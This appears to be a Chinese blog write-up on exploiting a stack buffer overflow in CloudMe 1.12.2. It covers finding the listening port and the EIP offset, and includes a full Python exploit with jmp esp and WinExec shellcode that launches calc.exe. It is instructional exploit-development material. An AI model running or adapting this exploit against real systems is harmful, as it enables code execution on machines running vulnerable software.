## cloudme 1.12.2 buffer overflow

2019-5-30

exploit-db上的POC<https://www.exploit-db.com/exploits/46218>

可在该网站下到本文使用到的二进制文件

### 确定漏洞

在安装程序后，运行CloudMe，使用`netstat -ano`命令发现，该程序会在本地回环地址127.0.0.1上监听TCP8888端口。

```
C:\Users\leaf>netstat -ano
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2908
```

使用python单次发送大量数据(8000个字节），程序会崩溃，确定有溢出的情况

由于程序使用到了QT中的网络请求函数，由于没用过此库，直接给recv函数下断没有反应，于是首先二分算法大致找到溢出至少需要发送的字节。然后再根据程序崩溃信息确定覆盖EIP的地方



### 漏洞利用

测试环境为 Windows 7 SP1 x64，关闭了ASLR

经过测试程序的栈上数据可以执行，于是考虑写入shellcode，通过跳转进行恶意代码的执行

此处使用的shellcode能自动定位WinExec函数在内存中的位置，详情见[跨Windows版本的shellcode](../windows_shellcode.md)

```python
#python3
from socket import *

buf=b'\x50\x53\x51\x52\x56\x57\x55\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x31\xF6\x64\x8B\x5E\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x26\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x46\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3' #call winexec to run calc.exe

jmpesp = b'\x9d\xdc\x86\x77'#7786DC9D  - FFE4            jmp esp, from kernel32.dll

def trigger(byte):
    fd = socket()
    fd.connect(("127.0.0.1", 8888))
    fd.send(b'a'*byte+b'BBBB' + jmpesp + buf)
    fd.close()

trigger(1048)

```

代码执行后服务崩溃，并会弹出一个计算器



### 扩展阅读

portable windows shellcode编写<https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html>